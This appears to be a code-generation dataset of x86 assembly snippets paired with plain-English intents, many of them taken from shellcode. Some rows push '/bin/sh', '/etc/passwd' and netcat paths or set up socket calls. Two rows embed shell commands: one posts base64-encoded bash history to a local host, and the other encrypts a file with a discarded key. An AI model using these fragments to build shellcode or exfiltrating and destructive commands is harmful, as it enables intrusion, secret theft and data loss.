SNIPPETS	INTENTS
mov ebx, [temp2]	move the contents at memory address temp2 to ebx
mov ebx, [x]	move the contents at memory address x to ebx
mov ebx, [y]	move the contents at memory address y to ebx
mov ebx, 0	exit with return code of 0
mov ebx, 0	return 0 status on exit
mov ebx, 0	return a code of zero
mov ebx, 0	specify file descriptor 0 as standard input
mov ebx, 0	use stdin
mov ebx, 0	write to the stdin file
mov ebx, 0x1	move 0x1 into ebx
mov ebx, 0x2	move 0x2 into ebx
mov ebx, 0x4	move 0x4 into ebx
mov ebx, 0x40000	move the 32-bit value 0x40000 into register ebx
mov ebx, 0x5	move 0x5 into ebx
mov ebx, 0xfee1dead	move the value 0xfee1dead into the ebx register
mov ebx, 1	file descriptor 1 standard output
mov ebx, 1	invoke subroutine socket
mov ebx, 1	move 1 into ebx
mov ebx, 1	specify file descriptor 1 standard output
mov ebx, 1	use stdout
mov ebx, 1	write to the stdout file
mov ebx, 10	move decimal value 10 into ebx
mov ebx, 2	invoke subroutine bind
mov ebx, 2	specify file descriptor 2 standard error
mov ebx, 3	invoke subroutine connect
mov ebx, 3	move 3 to the ebx register
mov ebx, 3	move decimal number 3 into ebx
mov ebx, 4	invoke subroutine listen
mov ebx, 5	invoke subroutine accept
mov ebx, 5	move 5 into ebx
mov ebx, 9	move number 9 into ebx
mov ebx, buff	move buff to ebx
mov ebx, command	move command into ebx
mov ebx, dword 0x5090508f	move dword 0x5090508f into ebx
mov ebx, dword 0x50905091	move dword 0x50905091 into ebx
mov ebx, eax	move eax into ebx
mov ebx, eax	move the address in eax into ebx
mov ebx, eax	move the contents of the eax register into the ebx register
mov ebx, ecx	move ecx into ebx
mov ebx, edi	move edi into ebx
mov ebx, edx	move edx into ebx
mov ebx, esi	move esi into ebx
mov ebx, esp	move address of stack pointer into ebx
mov ebx, esp	move esp into ebx
mov ebx, esp	move the address of the character on the stack into ebx
mov ebx, esp	move the contents of the esp register into the ebx register
mov ebx, esp	point ebx to stack
mov ebx, esp	push /bin/sh into ebx
mov ebx, filename	move filename into ebx
mov ebx, m_src1	move m_src1 to ebx
mov ebx, m_src2	move m_src2 to ebx
mov ebx, msg	move the address of msg string into ebx
mov ebx, n	move n to ebx
mov ebx, name	move name into ebx
mov ebx, request	move address of request variable into ebx
mov ebx, sock_reg	move sock_reg into ebx
mov ebx, type var3	move the number of bytes of var3 into ebx
mov ebx, upcase	move the value of upcase into ebx
mov ebx, x	move the contents of x into ebx
mov ebx, zero_reg	move zero_reg into ebx
mov ecx, [ebp+12]	move the contents at the memory location specified by the result of the operation [ebp+12] into the ecx register
mov ecx, [ebp+12]	move the contents of the address [ebp+12] into ecx
mov ecx, [esi+4*eax]	move the 4 bytes of data at address esi+4*eax into ecx
mov ecx, [esp]	move the contents of esp into ecx
mov ecx, [esp]	move the contents of the esp register into the ecx register
mov ecx, [my_table]	move effective address of my_table in ecx
mov ecx, [temp3]	move the contents at memory address temp3 to ecx
mov ecx, [x]	move the contents at memory address x to ecx
mov ecx, 0777	move permissions to read write and execute into ecx
mov ecx, 0x0	move 0x0 into ecx
mov ecx, 0x1	move 0x1 into ecx
mov ecx, 0x88998899	move 0x88998899 into ecx
mov ecx, 1	move 1 into ecx
mov ecx, 36	get 36 in the ecx
mov ecx, 4294948047	move 4294948047 into ecx
mov ecx, 672274793	move the value 672274793 into the ecx register
mov ecx, arguments	move the address of the arguments into ecx
mov ecx, array	move the first element of array into ecx
mov ecx, array2	move the first element in array2 into ecx
mov ecx, b	move b to ecx
mov ecx, buff	move buff to ecx
mov ecx, buffer	move the memory address of buffer variable into ecx
mov ecx, contents	move the memory address of contents string into ecx
mov ecx, contents	move the memory address of contents variable into ecx
mov ecx, donemsg	move donemsg into ecx
mov ecx, eatmsg	move eatmsg into ecx
mov ecx, eax	move eax into ecx
mov ecx, ebp	move ebp into ecx
mov ecx, edi	move edi into ecx
mov ecx, edx	move edx into ecx
mov ecx, edx	move the contents of the edx register into the ecx register
mov ecx, esi	move esi into ecx
mov ecx, esp	ecx point to the top of the stack
mov ecx, esp	move address of arguments into ecx
mov ecx, esp	move address of stack pointer into ecx
mov ecx, esp	move esp into ecx
mov ecx, esp	move the address of the stack pointer into ecx
mov ecx, esp	move the contents of esp into ecx
mov ecx, esp	move the contents of the esp register into the ecx register
mov ecx, esp	point ecx to the top of the stack
mov ecx, esp	save the memory location of arg[0] into the ecx register
mov ecx, filecontents	move the memory address of our file contents variable into ecx
mov ecx, hello	put the offset of hello in ecx
mov ecx, hexstr	move hexstr into ecx
mov ecx, m_src3	move m_src3 to ecx
mov ecx, msg	move msg to ecx
mov ecx, msg	move the address of message string into ecx
mov ecx, msg	move the memory address of message string into ecx
mov ecx, offset array	move starting address of array to ecx
mov ecx, readbuffer	move readbuffer into ecx
mov ecx, request	move address of request variable into ecx
mov ecx, response	move address of response variable into ecx
mov ecx, rm	move rm to ecx
mov ecx, rn	move rn to ecx
mov ecx, type var2	move the number of bytes of var2 into ecx
mov ecx, y	move the contents of y into ecx
mov edi, [ebp+16]	move value the contents of memory address ebp+16 into edi
mov edi, 0x343997b7	move 0x343997b7 into edi
mov edi, 0x3734b117	move 0x3734b117 into edi
mov edi, 0x978cd092	move 0x978cd092 into edi
mov edi, 0x978cd0d0	move 0x978cd0d0 into edi
mov edi, 0xada67373	move 0xada67373 into edi
mov edi, 876189623	move 876189623 into edi
mov edi, 884021143	move 884021143 into edi
mov edi, eax	move eax into edi
mov edi, eax	move the return value of sys_socketcall into edi
mov edi, ecx	move ecx into edi
mov edi, ecx	move ecx to edi
mov edi, edx	move edx into edi
mov edi, edx	move the remainder into edi
mov edi, esi	move esi into edi
mov edi, esp	move esp into edi
mov edi, hexstr	place hexstr into edi
mov edx, [esi+4*ebx]	move the 4 bytes of data at address esi+4*ebx into edx
mov edx, [esp]	move the contents of the esp register into the edx register
mov edx, [temp4]	move the contents at memory address temp4 to edx
mov edx, [z]	move the contents at memory address z to edx
mov edx, 0x1234567	move the value 0x1234567 into the edx register
mov edx, 1	move 1 into edx
mov edx, 11	move integer 11 to edx
mov edx, 12	move 12 to edx
mov edx, 13	move 13 into edx
mov edx, 2	move decimal 2 into edx
mov edx, 255	move decimal number 255 into edx
mov edx, 3	move 3 decimal into edx
mov edx, 43	move 43 decimal into edx
mov edx, 43	move decimal 43 into edx
mov edx, 66729180	move 66729180 into edx
mov edx, 78	move decimal 78 into edx
mov edx, 78	store 78 decimal into edx
mov edx, 8	move 8 decimal into edx
mov edx, 8	put 8 into edx
mov edx, 9	move number 9 into edx
mov edx, buff	move buff to edx
mov edx, bufflen	move bufflen into edx
mov edx, donelen	move donelen into edx
mov edx, dword 0x65676760	move dword 0x65676760 into edx
mov edx, dword 0x65676760	move the doubleword 0x65676760 into edx
mov edx, eatlen	move eatlen into edx
mov edx, eax	move eax into edx
mov edx, ebp	move ebp into edx
mov edx, ecx	move ecx into edx
mov edx, ecx	move ecx to edx
mov edx, environment	move the address of environment variable into edx
mov edx, esi	move esi into edx
mov edx, esp	move address of stack pointer into edx
mov edx, esp	move esp into edx
mov edx, esp	move the contents of the esp register into the edx register
mov edx, esp	move the stack pointer into edx
mov edx, filename	move filename into edx
mov edx, hellolen	move hellolen into edx
mov edx, hexlen	move hexlen into edx
mov edx, len	move variable len to edx
mov edx, m_src4	move m_src4 to edx
mov edx, n	move n to edx
mov edx, readbuffer	move readbuffer into edx
mov edx, readlen	move readlen into edx
mov edx, response	move address of response variable into edx
mov edx, src	move the contents of src variable into edx
mov edx, tmp	move the contents of tmp variable into edx
mov edx, type var1	move the number of bytes of var1 into edx
mov esi, [ebp+12]	move the contents of memory address ebp+12 into esi
mov esi, 0x222933f0	move 0x222933f0 into esi
mov esi, 0x243525f0	move 0x243525f0 into esi
mov esi, 0x34399797	move 0x34399797 into esi
mov esi, 0x353ffc3b	move 0x353ffc3b into esi
mov esi, 0x563a1f3e	move 0x563a1f3e into esi
mov esi, 0x65636170	move 0x65636170 into esi
mov esi, 0x68732f2f	move 0x68732f2f into esi
mov esi, 0x72702f2f	move 0x72702f2f into esi
mov esi, 0x735f6176	move 0x735f6176 into esi
mov esi, 0x91969dd0	move 0x91969dd0 into esi
mov esi, 0xd2c45e5e	move 0xd2c45e5e into esi
mov esi, 10	move 10 into esi
mov esi, 9	move 9 into esi
mov esi, buff	place address buff into esi
mov esi, eax	move eax into esi
mov esi, eax	move pointer in eax into esi
mov esi, ecx	move ecx into esi
mov esi, edx	move remainder into esi
mov esi, esp	move esp into esi
mov esi, v	move v to esi
mov esi, v_src	move v_src to esi
mov esi, var	copy the address of var into esi
mov esp, ebp	move the contents of the ebp register ino the esp register
mov esp, ebp	move the contents of the ebp register into the esp register
mov long [esi+18], esi	move the contents of the esi register into the long starting at the address [esi+18]
mov long [esi+22], ebx	move the contents of the ebx register into the long starting at the address [esi+22]
mov long [esi+22], esi	move the contents of the esi register into the long starting at the address [esi+22]
mov long [esi+26], eax	move the contents of the eax register into the long starting at the address [esi+26]
mov long [esi+26], ebx	move the contents of the ebx register into the long starting at the address [esi+26]
mov long [esi+30], eax	move the contents of the eax register into the long starting at the address [esi+30]
mov sock_reg, eax	move eax into sock_reg
mov total, 48	transfer the value 48 in the memory variable total
mov word [ebx], 2	move the 16-bit integer representation of 2 into the 2 bytes starting at the address in ebx
mov word [ecx], 2	move the 16-bit integer representation of 2 into the 2 bytes starting at address ecx
mov word [esp+0x1], 0x776f	move 0x776f into the word in [esp+0x1]
mov x, eax	move eax to x variable
msg db 'hello, world!', 0xa	declare msg string containing 'hello world!'
msg db 'i love you!', 0ah	define msg variable and initialize with 'i love you!'
msg db 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post', 0x0a	define msg as the byte string 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post'
msg db 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt', 0x0a	define msg as the byte string 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt'
msg db 'we found the egg!', 0ah, 0dh	define msg as the byte string 'we found the egg!'
msg_len equ $-msg	define msg_len equal to the length of msg
msg1 db 'hello, brave new world!', 0ah	declare message string msg1 containing 'hello brave new world!'
msg2 db 'this is how we recycle in nasm.', 0ah	declare message string msg2 containing 'this is how we recycle in nasm'
msg2 db 'passwd', 0x00	define msg2 as the byte string 'passwd'
msglength: equ 12	declare msglength to have the constant value 12
mul [tmp]	multiply the contents of eax by the 32-bit contents of the memory location tmp
mul [value]	multiply the contents of eax by the 32-bit contents of the memory location value
mul [var]	multiply the contents of eax by the 32-bit contents of the memory location var
mul 0x10	multiply eax by 0x10 and stores the result in edx:eax
mul 25	multiply the contents of eax by 25
mul 3	multiply the contents of eax by 3
mul ebx	mul eax by ebx
mul ebx	multiply eax by ebx
mul ebx	multiply eax by the contents of the ebx register
mul ebx	multiply the contents of eax by ebx
mul ebx	multiply the contents of the eax register by the contents of the ebx register
mul ecx	mul eax by ecx
mul ecx	multiply eax by ecx
mul ecx	multiply eax by the contents of the ecx register
mul ecx	mutliply eax by ecx
mul edx	mul eax by edx
mul edx	multiply eax by edx
mul edx	multiply eax by the contents of the edx register
my_table times 10 dw 0	allocate 10 words each initialized to 0
my_table times 10 dw 0	allocate my_table vector of 10 words each initialized to 0
my_var dw 0abcdh	define my_var word variable and initialize it to 0abcdh
myList word 1,2,3,4,5	define myList array of word and initialize it to 1, 2, 3, 4, and 5
name db '/bin/sh', 0	define name as the byte string '/bin/sh'
name db 30 dup	allocate memory for 30 bytes uninitialized name variable
neg eax	negate eax
neg eax	negate the contents of eax
neg eax	replaces the contents of the eax register with its two's complement
neg ebx	replaces the contents of the ebx register with its two's complement
neg ecx	replaces the contents of the ecx register with its two's complement
neg edi	negate edi
neg edi	replaces the contents of the edi register with its two's complement
neg edx	replaces the contents of the edx register with its two's complement
neg var	negate the contents of var
neg_number dw -12345	define the variable neg_number of words and initialize it to -12345
negative:	define negative label
next_addr:	declare next_addr function
next_addr:	declare the next_addr label
next_cycle:	declare the next_cycle label
next_cycle:	define next_cycle label
next_page:	declare next_page function
next:	declare the next label
nop	do no operation
nop	do nothing
nop	no operation
not ax	negate all the bits of ax register
not ax	negate all the bits of the ax register
not byte [esi]	perform a bit-wise inversion of the byte starting at the address in esi
not byte [tmp]	negate all bits in the byte at the memory location tmp
not byte [var]	negate all bits in the byte at the memory location var
not byte [var2]	negate all bits in the byte at the memory location var2
not dl	negate all the bits of dl register
not eax	negate all the bits of the eax register
not ecx	negate all the bits of ecx register
not ecx	negate all the bits of the ecx register
not edi	negate all the bits of the edi register
not edx	perform a bit-wise inversion of edx
not esi	negate all the bits of the esi register
not word ax	negate all the bits of the word at the address ax
number dw 12345	define number variable of a word and initialize to 12345
number: resb 1	reserve 1 byte for number variable
numbers dw 34, 45, 56, 67, 75, 89	declare an array of six words each initialized with the numbers 34 45 56 67 75 89
odd_number:	declare odd_numer function
one:	declare one label
one:	declare the one label
or al, bl	perform or operation between al and bl registers
or al, syscall_execve	perform or operation between the al register and syscall_execve
or cx, 0xfff	perform logical or between the cx register and 0xfff
or dx, 0xfff	perform or operation between dx and 0xfff and save the result into dx
or eax, 0xffffffff	perform the or operation between the eax register and 0xffffffff
output:	declare the output label
path db '//bin/sh'	define path as the byte string '//bin/sh'
path db '//bin/sh'	define the byte string path and initialize it to '//bin/sh'
path:	declare the path label
pop [eax]	pop the top element of the stack into memory at the four bytes starting at location eax
pop [ebx]	pop the top element of the stack into memory at the four bytes starting at location ebx
pop ax	pop the last element pushed onto the stack into ax
pop bx	pop the last element pushed onto the stack into bx
pop cx	pop the last element pushed onto the stack into cx
pop cx	pop the value on the stack back into cx
pop cx	restore the top of the stack into the cx register
pop dx	pop the value on the stack back into dx
pop dx	restore the top of the stack into the dx register
pop eax	pop the next argument off the stack into eax
pop eax	pop the top of the stack into the eax register
pop eax	pop the value on the stack back into eax
pop eax	put syscall value into eax
pop eax	remove last character from the stack into eax
pop eax	remove last character from the stack into edx
pop eax	restore eax from the value we pushed onto the stack at the start
pop eax	restore the original value of eax
pop eax	restore the top of the stack into eax register
pop eax	restore the top of the stack into the eax register
pop ebp	restore ebp register
pop ebp	restore the top of the stack into the ebp register
pop ebx	pop the value on the stack back into ebx
pop ebx	remove last character from the stack into ebx
pop ebx	restore ebx from the value we pushed onto the stack at the start
pop ebx	restore the original value of ebx
pop ebx	restore the top of the stack into ebx register
pop ebx	restore the top of the stack into the ebx register
pop ecx	pop the value on the stack back into ecx
pop ecx	remove last character from the stack into ecx
pop ecx	restore ecx from the value we pushed onto the stack at the start
pop ecx	restore ecx register
pop ecx	restore the top of the stack into the ecx register
pop ecx \n loop l1 \n mov eax, 1	restore the top of the stack into the ecx register then decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else make the system call exit
pop ecx \n loop l2 \n mov eax, 1	restore the top of the stack into the ecx register then decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else make the system call exit
pop ecx \n loop l3 \n mov eax, 1	restore the top of the stack into the ecx register then decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else make the system call exit
pop edi	pop the top element of the stack into edi
pop edi	restore the top of the stack into the edi register
pop edx	pop the top of the stack into the edx register
pop edx	pop the value on the stack back into edx
pop edx	restore edx from the value we pushed onto the stack at the start
pop edx	restore the top of the stack into edx register
pop edx	restore the top of the stack into the edx register
pop esi	pop the top of the stack into the esi register
pop esi	pop the value on the stack back into esi
pop esi	restore esi from the stack
pop esi	restore esi from the value we pushed onto the stack at the start
pop esi	restore the top of the stack into esi register
pop esi	restore the top of the stack into the esi register
pop esp	restore the top of the stack into the esp register
pop si	restore the top of the stack into the si register
popad	move doublewords from the stack into the 32 bit registers
popad	move doublewords from the stack into the general purpose registers
popad	pop doublewords from the stack into the 32 bit registers
popad	pop doublewords from the stack into the general purpose registers
port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77	define port array of 5 bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77	define port as an array of bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77
prepare:	declare the prepare label
priv_setgid:	declare the priv_setgid label
priv_setuid:	declare the priv_setuid label
process_shellcode:	declare the process_shellcode label
push _ip	push _ip onto the stack
push '//pa'	push '//pa' onto the stack
push '//sh'	push '//sh' onto the stack
push '/bin'	push '/bin' onto the stack
push '/etc'	push '/etc' onto the stack
push 'sswd'	push 'sswd' onto the stack
push [tmp]	push the 4 bytes at address tmp onto stack
push [var]	push the 4 bytes at address var onto the stack
push [var2]	push the 4 bytes at address var2 onto the stack
push 0bh	push 0bh onto the stack
push 0x0	push 0x0 onto the stack
push 0x0	push the value 0x0 to the stack
push 0x04020a0a	push 0x04020a0a onto the stack
push 0x0a206873	push 0x0a206873 onto the stack
push 0x0a3a7964	push 0x0a3a7964 onto the stack
push 0x0a4c4c41	push 0x0a4c4c41 onto the stack
push 0x0a4c4c41	push the 0x0a4c4c41 onto the stack
push 0x1	push 0x1 onto the stack
push 0x1	push 0x1 to the stack
push 0x1	push the 0x1 onto the stack
push 0x10	push 0x10 onto the stack
push 0x10	push 0x10 to the stack
push 0x10	push the 0x10 onto the stack
push 0x10	push the value 0x10 onto the stack
push 0x16	push 0x16 onto the stack
push 0x1a	push 0x1a onto the stack
push 0x1a	push 0x1a to the stack
push 0x1c	push 0x1c onto the stack
push 0x1c	push 0x1c to the stack
push 0x2	push 0x2 onto the stack
push 0x2	push 0x2 to the stack
push 0x2	push the 0x2 onto the stack
push 0x203a4457	push 0x203a4457 onto the stack
push 0x203a4457	push the 0x203a4457 onto the stack
push 0x204c4c41	push 0x204c4c41 onto the stack
push 0x204c4c41	push the 0x204c4c41 onto the stack
push 0x2431243a	push 0x2431243a onto the stack
push 0x29	push 0x29 onto the stack
push 0x29	push 0x29 to the stack
push 0x2e312e31	push 0x2e312e31 onto the stack
push 0x2e312e31	push 0x2e312e31 to the stack
push 0x2e323931	push 0x2e323931 onto the stack
push 0x2e323931	push 0x2e323931 to the stack
push 0x2e373231	push 0x2e373231 onto the stack
push 0x2e373231	push 0x2e373231 to the stack
push 0x2e383631	push 0x2e383631 onto the stack
push 0x2e383631	push 0x2e383631 to the stack
push 0x2f2f2f2f	push 0x2f2f2f2f onto the stack
push 0x2f2f2f2f	push 0x2f2f2f2f to the stack
push 0x2f2f2f2f	push the 0x2f2f2f2f onto the stack
push 0x2f2f2f2f \n mov eax, esp	push the value 0x2f2f2f2f onto the stack and point eax to the stack register
push 0x2f2f2f2f \n mov ebx, esp	push the value 0x2f2f2f2f onto the stack and point ebx to the stack register
push 0x2f2f2f2f \n mov ecx, esp	push the value 0x2f2f2f2f onto the stack and point ecx to the stack register
push 0x2f2f2f2f \n mov edi, esp	push the value 0x2f2f2f2f onto the stack and point edi to the stack register
push 0x2f2f2f2f \n mov edx, esp	push the value 0x2f2f2f2f onto the stack and point edx to the stack register
push 0x2f2f2f2f \n mov esi, esp	push the value 0x2f2f2f2f onto the stack and point esi to the stack register
push 0x2f2f2f6e	push the 0x2f2f2f6e onto the stack
push 0x2f3a706d	push 0x2f3a706d onto the stack
push 0x2f3a746f	push 0x2f3a746f onto the stack
push 0x2f656c2d	push 0x2f656c2d onto the stack
push 0x2f656c2d	push the 0x2f656c2d onto the stack
push 0x2f6e6962	push 0x2f6e6962 onto the stack
push 0x2f6e6962	push 0x2f6e6962 to the stack
push 0x30	push the value 0x30 onto the stack
push 0x30313a31	push 0x30313a31 onto the stack
push 0x30313a31	push 0x30313a31 to the stack
push 0x30317974	push 0x30317974 onto the stack
push 0x30317974	push the 0x30317974 onto the stack
push 0x31313131	push 0x31313131 onto the stack
push 0x3131313a	push 0x3131313a onto the stack
push 0x31373737	push 0x31373737 onto the stack
push 0x31373737	push the 0x31373737 onto the stack
push 0x3170762d	push 0x3170762d onto the stack
push 0x3170762d	push 0x3170762d to the stack
push 0x3170762d	push the 0x3170762d onto the stack
push 0x32322e32	push 0x32322e32 onto the stack
push 0x32322e32	push 0x32322e32 to the stack
push 0x3458652e	push 0x3458652e onto the stack
push 0x37373333	push 0x37373333 onto the stack
push 0x37373333	push 0x37373333 to the stack
push 0x37373333	push the 0x37373333 onto the stack
push 0x3a303a3a	push 0x3a303a3a onto the stack
push 0x3a30754a	push 0x3a30754a onto the stack
push 0x3d4c4c41	push 0x3d4c4c41 onto the stack
push 0x3d4c4c41	push the 0x3d4c4c41 onto the stack
push 0x3e0a7964	push 0x3e0a7964 onto the stack
push 0x4	push 0x4 onto the stack
push 0x4	push the 0x4 onto the stack
push 0x45683933	push 0x45683933 onto the stack
push 0x46	push 0x46 onto the stack
push 0x4c4c4128	push 0x4c4c4128 onto the stack
push 0x4c4c4128	push the 0x4c4c4128 onto the stack
push 0x4c5a304b	push 0x4c5a304b onto the stack
push 0x4f4e2029	push 0x4f4e2029 onto the stack
push 0x4f4e2029	push the 0x4f4e2029 onto the stack
push 0x5	push 0x5 onto the stack
push 0x5	push the 0x5 onto the stack
push 0x50446862	push 0x50446862 onto the stack
push 0x53534150	push 0x53534150 onto the stack
push 0x53534150	push the 0x53534150 onto the stack
push 0x6	push 0x6 onto the stack
push 0x6	push the 0x6 value onto the stack
push 0x61622f2f	push 0x61622f2f onto the stack
push 0x61622f6e	push 0x61622f6e onto the stack
push 0x61655220	push 0x61655220 onto the stack
push 0x6168732f	push 0x6168732f onto the stack
push 0x6168732f	push 0x6168732f to the stack
push 0x6168732f	push the 0x6168732f onto the stack
push 0x6168732f \n push 0x6374652f \n mov ebx, esp	push the value 0x6168732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
push 0x61702f2f	push 0x61702f2f onto the stack
push 0x61702f2f \n push 0x6374652f \n mov eax, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the eax register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov ebx, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ebx register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov ecx, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ecx register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov edi, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edi register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov edx, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edx register to the stack register
push 0x61702f2f \n push 0x6374652f \n mov esi, esp	push the value 0x61702f2f and the value 0x6374652f onto the stack and point the esi register to the stack register
push 0x61702f63	push 0x61702f63 onto the stack
push 0x61702f63	push the 0x61702f63 onto the stack
push 0x622f7273	push 0x622f7273 onto the stack
push 0x622f7273	push 0x622f7273 to the stack
push 0x636e2f2f	push 0x636e2f2f onto the stack
push 0x636e2f2f	push 0x636e2f2f to the stack
push 0x636e2f2f	push the 0x636e2f2f onto the stack
push 0x6374652f	push 0x6374652f onto the stack
push 0x6374652f	push 0x6374652f to the stack
push 0x6374652f	push the 0x6374652f onto the stack
push 0x6374652f \n mov eax, esp	push the value 0x6374652f onto the stack and point eax to the stack register
push 0x6374652f \n mov ebp, esp	push the value 0x6374652f onto the stack and point ebp to the stack register
push 0x6374652f \n mov ebx, esp	push the value 0x6374652f onto the stack and point ebx to the stack register
push 0x6374652f \n mov ecx, esp	push the value 0x6374652f onto the stack and point ecx to the stack register
push 0x6374652f \n mov edi, esp	push the value 0x6374652f onto the stack and point edi to the stack register
push 0x6374652f \n mov edx, esp	push the value 0x6374652f onto the stack and point edx to the stack register
push 0x6374652f \n mov esi, esp	push the value 0x6374652f onto the stack and point esi to the stack register
push 0x64687373	push 0x64687373 onto the stack
push 0x64687373 \n mov eax, esp	push the value 0x64687373 onto the stack and point the eax register to the stack register
push 0x64687373 \n mov ebp, esp	push the value 0x64687373 onto the stack and point the ebp register to the stack register
push 0x64687373 \n mov ebx, esp	push the value 0x64687373 onto the stack and point the ebx register to the stack register
push 0x64687373 \n mov ecx, esp	push the value 0x64687373 onto the stack and point the ecx register to the stack register
push 0x64687373 \n mov edi, esp	push the value 0x64687373 onto the stack and point the edi register to the stack register
push 0x64687373 \n mov edx, esp	push the value 0x64687373 onto the stack and point the edx register to the stack register
push 0x64687373 \n mov esi, esp	push the value 0x64687373 onto the stack and point the esi register to the stack register
push 0x6475732f	push 0x6475732f onto the stack
push 0x6475732f	push 0x6475732f to the stack
push 0x6475732f	push the 0x6475732f onto the stack
push 0x6475732f \n push 0x6374652f \n mov eax, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the eax register to the stack register
push 0x6475732f \n push 0x6374652f \n mov ebx, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
push 0x6475732f \n push 0x6374652f \n mov ecx, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the ecx register to the stack register
push 0x6475732f \n push 0x6374652f \n mov edi, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the edi register to the stack register
push 0x6475732f \n push 0x6374652f \n mov edx, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the edx register to the stack register
push 0x6475732f \n push 0x6374652f \n mov esi, esp	push the value 0x6475732f and the value 0x6374652f onto the stack and point the esi register to the stack register
push 0x64777373	push 0x64777373 onto the stack
push 0x64777373	push the 0x64777373 onto the stack
push 0x6567772f	push 0x6567772f onto the stack
push 0x6567772f	push 0x6567772f to the stack
push 0x656c6966	push 0x656c6966 onto the stack
push 0x656c6966	push the 0x656c6966 onto the stack
push 0x65726f43	push 0x65726f43 onto the stack
push 0x65782e2f	push 0x65782e2f onto the stack
push 0x65782e2f	push 0x65782e2f to the stack
push 0x66	push 0x66 onto the stack
push 0x66	push 0x66 to the stack
push 0x66	push the 0x66 onto the stack
push 0x67513231	push 0x67513231 onto the stack
push 0x6769666e	push 0x6769666e onto the stack
push 0x682f2f2f	push 0x682f2f2f onto the stack
push 0x682f2f2f	push the 0x682f2f2f value onto the stack
push 0x68732f2f	push //sh to the stack
push 0x68732f2f	push 0x68732f2f onto the stack
push 0x68732f2f	push 0x68732f2f to the stack
push 0x68732f2f	push ascii sh// onto stack
push 0x68732f2f	push hs//
push 0x68732f2f	push the 0x68732f2f value onto the stack
push 0x68732f2f	push the value 0x68732f2f onto the stack
push 0x68732f2f \n push 0x6e69622f \n mov eax, esp	push /bin/sh onto the stack and point the eax register to the stack register
push 0x68732f2f \n push 0x6e69622f \n mov eax, esp	move /bin/sh into eax
push 0x68732f2f \n push 0x6e69622f \n mov eax, esp	put ASCII /bin/sh into eax
push 0x68732f2f \n push 0x6e69622f \n mov eax, esp	move /bin/sh into the eax register
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	push ASCII /bin/sh onto the stack and point the ebx register to the stack register
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	put /bin/sh into ebx
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	move ASCII /bin/sh into ebx
push 0x68732f2f \n push 0x6e69622f \n mov ebx, esp	move /bin/sh into the ebx register
push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp	push /bin/sh onto the stack and point the ecx register to the stack register
push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp	put /bin/sh into ecx
push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp	move ASCII /bin/sh into ecx
push 0x68732f2f \n push 0x6e69622f \n mov ecx, esp	move /bin/sh into the ecx register
push 0x68732f2f \n push 0x6e69622f \n mov edx, esp	push ASCII /bin/sh onto the stack and point the edx register to the stack register
